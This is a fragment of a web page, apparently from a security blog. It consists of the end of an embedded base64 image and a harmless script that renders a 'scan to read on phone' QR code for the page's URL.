lhf8sQvt4g/NcE5zD+aEv14hnhvEE4ewD7TqezyC4R10z24e4mafmtAb3A/Y/Jf14sz/lTR3OKcG9dV6L7gQFnHXRgtL7iPY3CJ+7ZvaQayYH9wk/w3hnWjh43AdaT/oK93tITvJNsAxE07kbd/aeXtDeDbPaeKPBWAMjJ39qhcqvAtwDzvckMJc69UmEC0LrDV/jqnbmAfeDE8tA6oK9ft0JDAOBc1rQrr+yzdwx4F51j15LHpx5w4H7wYjxBMGe5EJoudk15ZvFzAvuBy3W9WAtXPrUOAwk5o2vOYE9kNec+/KqTxkI+FGsHz0wlytHA/NApPIPlEMAx29TkwvBXPqIW0XvSV5jasOB+4evEazd8dZ1/Tr14H69rvwpA1GjHc85gacMpJ88nD9WZpuwviviCaZfcuGMq/noQvGzAO8BKDLQPI3gHM7XoJ6KUnSxkE9xYRkkOK/5lIEMV9jEl09gGIimu4pHV6nr4gVPP3ntAWtgjOcOps/MC+4HxnhSIwwXFNdHtDuY2nj7PLyw15ILh4GoYMfrTqAMBHw3wWNcbRfO2ng0dUXyGsXXAWc9tN/DwVrqoc3D15jeYC+cGC2YOjg94HW0HlMrBHvBGK+0BLQatLlqykCU7Hj9CeyBvH4GzQ7+BwAA///AQtS5AAAABklEQVQDANladZLAXEnAAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPagemycoupon-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 